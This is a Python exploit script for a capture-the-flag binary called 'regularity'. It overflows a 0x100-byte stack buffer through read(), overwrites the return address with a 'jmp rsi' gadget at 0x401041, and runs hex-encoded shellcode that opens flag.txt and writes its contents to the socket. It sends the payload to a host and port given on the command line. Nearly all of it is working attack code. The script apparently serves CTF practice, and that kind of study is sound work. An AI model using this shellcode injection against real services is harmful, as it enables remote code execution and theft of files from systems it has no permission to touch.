#!/usr/bin/env python3
"""regularity: stack overflow in read() (0x110 bytes into a 0x100 byte buffer).

read() copies 0x110 bytes into a 0x100 byte buffer, so the saved return address
at buffer+0x100 is overwritten. The return goes to `jmp rsi` at 0x401041. read()
leaves rsi pointing at the buffer, so the shellcode at the start of the buffer runs.
The stack is rwx.

The shellcode (source in shellcode.s) opens flag.txt, reads it and writes it to
the socket.
"""
import socket
import struct
import sys

JMP_RSI = 0x401041
BUF_SIZE = 0x100
SHELLCODE = bytes.fromhex("eb365f31f631d2b8020000000f0589c7488db42400fcffffba0001000031c00f0589c2bf01000000b8010000000f0531ffb83c0000000f05e8c5ffffff666c61672e74787400")


def payload():
    assert len(SHELLCODE) <= BUF_SIZE
    return SHELLCODE.ljust(BUF_SIZE, b"\x90") + struct.pack("<Q", JMP_RSI) + b"A" * 8


def solve(host, port):
    data = payload()
    assert len(data) == 0x110
    with socket.create_connection((host, port), timeout=30) as s:
        banner = b""
        while b"days?\n" not in banner:
            chunk = s.recv(4096)
            if not chunk:
                break
            banner += chunk
        print(banner.decode(errors="replace"), end="")
        s.sendall(data)
        out = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
        print(out.decode(errors="replace"))


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <ip> <port>")
        sys.exit(1)
    solve(sys.argv[1], int(sys.argv[2]))
